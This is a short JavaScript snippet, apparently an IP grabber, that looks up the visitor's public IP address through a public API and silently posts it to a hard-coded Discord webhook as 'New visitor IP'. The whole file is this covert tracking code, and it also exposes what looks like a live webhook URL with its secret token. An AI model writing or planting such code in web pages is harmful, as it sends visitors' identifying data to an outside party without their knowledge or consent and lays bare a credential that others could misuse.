// Fetch the IP address using a public API
fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        console.log('Your IP address is: ', data.ip);
        sendToDiscord(data.ip);
    })
    .catch(error => console.error('Error fetching IP address:', error));

// Function to send the IP address to the Discord webhook
function sendToDiscord(ip) {
    const webhookUrl = 'https://discord.com/api/webhooks/1256629643147214848/S_KlGZ0aHncGM9OTqdj6zg4Nh9DGbnVfGWsJk-R8jN5NVnbZs3ck56bv3vRPHZx5EI_b';
    const payload = {
        content: `New visitor IP: ${ip}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => response.json())
    .then(data => {
        console.log('IP sent to Discord successfully:', data);
    })
    .catch(error => console.error('Error sending IP to Discord:', error));
}
